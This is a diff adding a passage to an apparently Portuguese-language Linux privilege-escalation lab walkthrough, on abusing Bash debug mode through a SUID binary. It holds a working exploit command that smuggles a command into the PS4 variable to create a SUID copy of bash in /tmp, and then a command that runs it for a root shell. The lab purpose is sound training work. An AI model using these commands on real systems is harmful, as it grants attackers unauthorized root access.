@@ -748,3 +748,29 @@ Agora, basta executar:
 /usr/local/bin/suid-env2
 ```
 Um bash como superusuário será iniciado.
+
+### Questões:
+
+- a. ***Read and follow along with the above.*** *Não há necessidade de resposta*
+
+## 15 - SUID / SGID Executables - Abusing Shell Features (#2) 
+
+Nota: Isso não funcionará nas versões Bash 4.4 e superiores.
+
+Quando no modo de depuração, o Bash usa a variável de ambiente ***PS4*** para exibir um prompt extra para instruções de depuração.
+
+Execute o executável ***/usr/local/bin/suid-env2*** com a depuração bash habilitada e a variável ***PS4*** definida como um comando incorporado que cria uma versão SUID de ***/bin/bash***:
+
+```shell
+env -i SHELLOPTS=xtrace PS4='$(cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash)' /usr/local/bin/suid-env2
+```
+
+Agora, executa-se o /tmp/rootbash com -p para obter um shell rodando com privilégios de root:
+
+```shell
+/tmp/rootbash -p
+```
+
+### Questões:
+
+- a. ***Read and follow along with the above.*** *Não há necessidade de resposta*
